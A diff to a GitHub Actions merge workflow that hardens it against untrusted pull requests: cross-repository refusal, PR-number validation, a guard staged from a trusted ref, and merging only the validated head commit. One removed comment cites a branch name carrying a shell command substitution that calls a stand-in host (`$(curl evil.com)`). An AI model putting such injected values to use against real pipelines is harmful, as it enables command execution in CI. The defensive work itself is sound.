@@ -44,12 +44,24 @@ jobs:
           EVENT_ACTION: ${{ github.event.action }}
           EVENT_LABEL: ${{ github.event.label.name }}
           EVENT_PR_BRANCH: ${{ github.event.pull_request.head.ref }}
+          EVENT_PR_HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
           EVENT_PR_NUMBER: ${{ github.event.pull_request.number }}
           INPUT_PR_NUMBER: ${{ github.event.inputs.pr_number }}
           GH_REPO: ${{ github.repository }}
         run: |
+          # A pull request from another repository stops here, before the
+          # checkout: on the label event the default checkout is the pull
+          # request's merge commit. The whole contract is checked after the
+          # checkout ("Check the pull request is the pipeline's own").
+          refuse() {
+            echo "::error::PR #${PR_NUM//[^0-9]/} refused (${1}): not one of the pipeline's own pull requests; nothing of it was fetched, merged or commented on"
+            echo "- PR #${PR_NUM//[^0-9]/} refused: \`${1}\`, not one of the pipeline's own pull requests" >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          }
           if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
             PR_NUM="$INPUT_PR_NUMBER"
+            # gh pr view also takes a URL or a branch name for its argument.
+            [[ "$PR_NUM" =~ ^[1-9][0-9]{0,9}$ ]] || refuse bad_number
             # Retry gh pr view — an unretried call here stranded an already
             # ai-approved PR (#9742) when the GitHub GraphQL API returned
             # HTTP 504 during the 2026-07-24 API brown-out. `bash -e` turned
@@ -57,7 +69,7 @@ jobs:
             # shape as impl-review.yml's "Extract PR info".
             PR_DATA=""
             for attempt in 1 2 3; do
-              if gh pr view "$PR_NUM" --repo "$GH_REPO" --json headRefName,labels > /tmp/pr.json 2> /tmp/pr.err; then
+              if gh pr view "$PR_NUM" --repo "$GH_REPO" --json headRefName,labels,isCrossRepository > /tmp/pr.json 2> /tmp/pr.err; then
                 PR_DATA=$(cat /tmp/pr.json)
                 break
               fi
@@ -75,6 +87,8 @@ jobs:
             fi
             BRANCH=$(echo "$PR_DATA" | jq -r '.headRefName')
             HAS_APPROVED=$(echo "$PR_DATA" | jq -r '[.labels[].name] | any(. == "ai-approved")')
+            # Exactly false: a missing or null field is not this repository.
+            SAME_REPO=$(echo "$PR_DATA" | jq -r 'if .isCrossRepository == false then "true" else "false" end')
           else
             ACTION="$EVENT_ACTION"
             LABEL="$EVENT_LABEL"
@@ -86,6 +100,10 @@ jobs:
               exit 0
             fi
             HAS_APPROVED="true"
+            SAME_REPO=false
+            if [ -n "$EVENT_PR_HEAD_REPO" ] && [ "${EVENT_PR_HEAD_REPO,,}" = "${GH_REPO,,}" ]; then
+              SAME_REPO=true
+            fi
           fi
 
           # Only process implementation/* branches
@@ -101,8 +119,11 @@ jobs:
             exit 0
           fi
 
+          [[ "$PR_NUM" =~ ^[1-9][0-9]{0,9}$ ]] || refuse bad_number
+          [ "$SAME_REPO" = "true" ] || refuse cross_repository
+
+          # The branch goes to the outputs from the guard, once it has passed it.
           echo "pr_number=$PR_NUM" >> $GITHUB_OUTPUT
-          echo "branch=$BRANCH" >> $GITHUB_OUTPUT
           echo "should_run=true" >> $GITHUB_OUTPUT
 
       - name: Checkout repository
@@ -111,15 +132,97 @@ jobs:
         with:
           fetch-depth: 0
 
+      # The pipeline acts only on its own pull requests: same repository,
+      # head branch implementation/<spec-id>/<library> with a registered
+      # library. The guard (automation/scripts/pr_guard.py) and the library
+      # list it checks against come from GUARD_REF, the workflow's own commit,
+      # never from a pull request's tree, and are staged before any step reads
+      # a pull request. The same step, word for word, stands in every job that
+      # takes a pull request (tests/unit/workflows/test_pr_guard_steps.py);
+      # docs/workflows/overview.md#pull-requests-the-pipeline-acts-on.
+      # On the label event the workflow's commit is the pull request's merge
+      # commit, so the guard comes from main as this checkout fetched it.
+      - name: Stage the pull request guard
+        if: steps.check.outputs.should_run == 'true'
+        env:
+          GUARD_REF: ${{ github.event_name == 'pull_request' && 'origin/main' || github.sha }}
+        run: |
+          G="$RUNNER_TEMP/pr-guard"
+          mkdir -p "$G/core"
+          if ! git show "${GUARD_REF}:automation/scripts/pr_guard.py" > "$G/pr_guard.py" \
+             || ! git show "${GUARD_REF}:core/constants.py" > "$G/core/constants.py" \
+             || ! (cd "$G" && python3 -c "from core.constants import SUPPORTED_LIBRARIES; print(' '.join(sorted(SUPPORTED_LIBRARIES)))") > "$G/libraries" \
+             || ! [ -s "$G/libraries" ]; then
+            rm -f "$G/pr_guard.py" "$G/libraries"
+            echo "::error::guard_failed: the pull request guard could not be staged from ${GUARD_REF}; no pull request is acted on"
+            echo "- Pull request guard: \`guard_failed\`, not staged from ${GUARD_REF}; no pull request was acted on" >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          fi
+          echo "Pull request guard staged from ${GUARD_REF}; libraries: $(cat "$G/libraries")"
+
+      # Before any step reads the pull request's content. `head_sha` is the
+      # commit "Validate PR completeness" reads and the only one the merge
+      # step merges.
+      - name: Check the pull request is the pipeline's own
+        if: steps.check.outputs.should_run == 'true'
+        id: guard
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPOSITORY: ${{ github.repository }}
+          PR_NUMBER: ${{ steps.check.outputs.pr_number }}
+        run: |
+          G="$RUNNER_TEMP/pr-guard"
+          PR_SHOWN="${PR_NUMBER//[^0-9]/}"
+          PR_SHOWN="${PR_SHOWN:0:10}"
+          refuse() {
+            echo "::error::PR #${PR_SHOWN} refused (${1}): not one of the pipeline's own pull requests; nothing of it was fetched, merged or commented on"
+            echo "- PR #${PR_SHOWN} refused: \`${1}\`, not one of the pipeline's own pull requests" >> "$GITHUB_STEP_SUMMARY"
+            exit 1
+          }
+          [[ "$PR_NUMBER" =~ ^[1-9][0-9]{0,9}$ ]] || refuse bad_number
+          READ_OK=0
+          for attempt in 1 2 3; do
+            if gh pr view "$PR_NUMBER" --repo "$REPOSITORY" \
+                 --json number,headRefName,headRefOid,isCrossRepository,headRepository,headRepositoryOwner \
+                 > "$RUNNER_TEMP/pr.json" 2> "$RUNNER_TEMP/pr.err"; then
+              READ_OK=1
+              break
+            fi
+            echo "::warning::gh pr view failed (attempt ${attempt}/3): $(head -c 500 "$RUNNER_TEMP/pr.err" | tr '\n' ' ')"
+            [ "$attempt" -lt 3 ] && sleep $((attempt * 5))
+          done
+          [ "$READ_OK" -eq 1 ] || refuse pr_unreadable
+          GUARD_RC=0
+          GUARD_OUT=$(python3 "$G/pr_guard.py" check --repo "$REPOSITORY" --libraries "$(cat "$G/libraries")" \
+            --number "$PR_NUMBER" < "$RUNNER_TEMP/pr.json") || GUARD_RC=$?
+          if [ "$GUARD_RC" -ne 0 ]; then
+            REASON=guard_failed
+            if [ "$GUARD_RC" -eq 1 ] && [[ "$GUARD_OUT" =~ ^reason=([a-z_]{1,40})$ ]]; then
+              REASON="${BASH_REMATCH[1]}"
+            fi
+            refuse "$REASON"
+          fi
+          BRANCH=$(sed -n 's/^branch=//p' <<< "$GUARD_OUT")
+          HEAD_SHA=$(sed -n 's/^head_sha=//p' <<< "$GUARD_OUT")
+          SPEC_ID=$(sed -n 's/^spec_id=//p' <<< "$GUARD_OUT")
+          LIBRARY=$(sed -n 's/^library=//p' <<< "$GUARD_OUT")
+          if [ -z "$BRANCH" ] || [ -z "$HEAD_SHA" ] || [ -z "$SPEC_ID" ] || [ -z "$LIBRARY" ]; then
+            refuse guard_failed
+          fi
+          {
+            echo "branch=$BRANCH"
+            echo "head_sha=$HEAD_SHA"
+            echo "specification_id=$SPEC_ID"
+            echo "library=$LIBRARY"
+          } >> "$GITHUB_OUTPUT"
+
       - name: Extract info from branch
         if: steps.check.outputs.should_run == 'true'
         id: extract
         env:
-          # Route the (still-untrusted) branch name through env: rather than
-          # `${{ … }}` interpolation in the run body — otherwise a branch like
-          # `implementation/foo/$(curl evil.com)` would be re-interpreted as
-          # a shell command substitution at the assignment site.
-          BRANCH: ${{ steps.check.outputs.branch }}
+          # Through env: rather than `${{ … }}` interpolation in the run body,
+          # although the guard has checked the branch's shape by now.
+          BRANCH: ${{ steps.guard.outputs.branch }}
         run: |
           # Format: implementation/{specification-id}/{library}
           SPEC_ID=$(echo "$BRANCH" | cut -d'/' -f2)
@@ -167,7 +270,8 @@ jobs:
           LANGUAGE: ${{ steps.extract.outputs.language }}
           LIBRARY: ${{ steps.extract.outputs.library }}
           EXT: ${{ steps.extract.outputs.ext }}
-          BRANCH: ${{ steps.check.outputs.branch }}
+          BRANCH: ${{ steps.guard.outputs.branch }}
+          HEAD_SHA: ${{ steps.guard.outputs.head_sha }}
           PR_NUM: ${{ steps.check.outputs.pr_number }}
           REPOSITORY: ${{ github.repository }}
         run: |
@@ -208,9 +312,15 @@ jobs:
             git fetch origin main
             REF="origin/main"
           else
-            # Fetch the PR branch to check its contents
+            # Fetch the PR branch to check its contents: the commit the guard
+            # read, which is the only one the merge step merges, not whatever
+            # the branch points at by now.
             git fetch origin "$BRANCH"
-            REF="origin/${BRANCH}"
+            if ! git cat-file -e "${HEAD_SHA}^{commit}" 2>/dev/null; then
+              echo "::error::PR #${PR_NUM}: the head the guard checked (${HEAD_SHA}) could not be fetched — not validating another commit; re-dispatch impl-merge.yml"
+              exit 1
+            fi
+            REF="$HEAD_SHA"
           fi
 
           # Check if implementation file exists on the PR branch (or on main)
@@ -303,10 +413,49 @@ jobs:
           PR_NUM: ${{ steps.check.outputs.pr_number }}
           REPOSITORY: ${{ github.repository }}
           HAS_ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN != '' }}
+          BRANCH: ${{ steps.guard.outputs.branch }}
+          VALIDATED_SHA: ${{ steps.guard.outputs.head_sha }}
+          SPEC_ID: ${{ steps.guard.outputs.specification_id }}
+          LIBRARY: ${{ steps.guard.outputs.library }}
         run: |
           if [ "$HAS_ADMIN_TOKEN" != "true" ]; then
             echo "::warning::ADMIN_TOKEN secret is not set — merge will fail if main ruleset enforces required status checks. Add a fine-grained PAT with Contents:Write + Pull requests:Write + Administration:Read+Write as repo secret ADMIN_TOKEN."
           fi
+
+          # Merge only what was checked: the guard passed this pull request
+          # at VALIDATED_SHA, and "Validate PR completeness" read that commit.
+          # `update-branch` below may put GitHub's merge of main on top, so
+          # before every attempt the pull request is read and checked again,
+          # and its head is taken only when it is that commit, or a merge
+          # whose first parent is that commit, whose second parent is on
+          # main, and whose tree is the clean merge of the two. The merge
+          # names that head (--match-head-commit), so a commit pushed in
+          # between is never merged.
+          # Prints the head to merge and returns 0; 1 = refused; 2 = could not
+          # read it this time.
+          G="$RUNNER_TEMP/pr-guard"
+          merge_target() {
+            local view out head
+            view=$(gh pr view "$PR_NUM" --repo "$REPOSITORY" \
+              --json number,headRefName,headRefOid,isCrossRepository,headRepository,headRepositoryOwner \
+              2> "$RUNNER_TEMP/head.err") || return 2
+            out=$(python3 "$G/pr_guard.py" check --repo "$REPOSITORY" --libraries "$(cat "$G/libraries")" \
+              --number "$PR_NUM" --spec-id "$SPEC_ID" --library "$LIBRARY" <<< "$view") || return 1
+            head=$(sed -n 's/^head_sha=//p' <<< "$out")
+            if [ "$head" = "$VALIDATED_SHA" ]; then
+              echo "$head"
+              return 0
+            fi
+            git fetch -q origin "+refs/heads/main:refs/remotes/origin/main" \
+              "+refs/heads/${BRANCH}:refs/remotes/origin/${BRANCH}" 2> "$RUNNER_TEMP/head.err" || return 2
+            git cat-file -e "${head}^{commit}" 2>/dev/null || return 2
+            [ "$(git rev-list --parents -n 1 "$head" | wc -w)" -eq 3 ] || return 1
+            [ "$(git rev-parse "${head}^1")" = "$VALIDATED_SHA" ] || return 1
+            git merge-base --is-ancestor "${head}^2" origin/main || return 1
+            [ "$(git merge-tree --write-tree "$VALIDATED_SHA" "${head}^2" 2>/dev/null)" = "$(git rev-parse "${head}^{tree}")" ] \
+              || return 1
+            echo "$head"
+          }
 
           MAX_ATTEMPTS=5
 
@@ -361,12 +510,21 @@ jobs:
             #
             # Bypass only works if the token has admin role. GITHUB_TOKEN is
             # only `write`, so a repo-admin PAT is required (ADMIN_TOKEN).
-            if gh pr merge "$PR_NUM" \
+            TARGET_RC=0
+            TARGET=$(merge_target) || TARGET_RC=$?
+            if [ "$TARGET_RC" -eq 1 ]; then
+              echo "::error::PR #${PR_NUM} not merged: its head is neither the checked commit ${VALIDATED_SHA} nor GitHub's merge of main into it, or the pull request no longer passes the guard; re-dispatch impl-merge.yml to check it again"
+              exit 1
+            fi
+            if [ "$TARGET_RC" -ne 0 ] || [ -z "$TARGET" ]; then
+              echo "Could not read the head of PR #${PR_NUM}: $(head -c 300 "$RUNNER_TEMP/head.err" 2>/dev/null | tr '\n' ' ')" > /tmp/merge.err
+            elif gh pr merge "$PR_NUM" \
               --repo "$REPOSITORY" \
               --squash \
               --admin \
-              --delete-branch 2> /tmp/merge.err; then
-              echo "::notice::Merge successful on attempt $attempt"
+              --delete-branch \
+              --match-head-commit "$TARGET" 2> /tmp/merge.err; then
+              echo "::notice::Merge successful on attempt $attempt (head ${TARGET})"
               exit 0
             fi
 
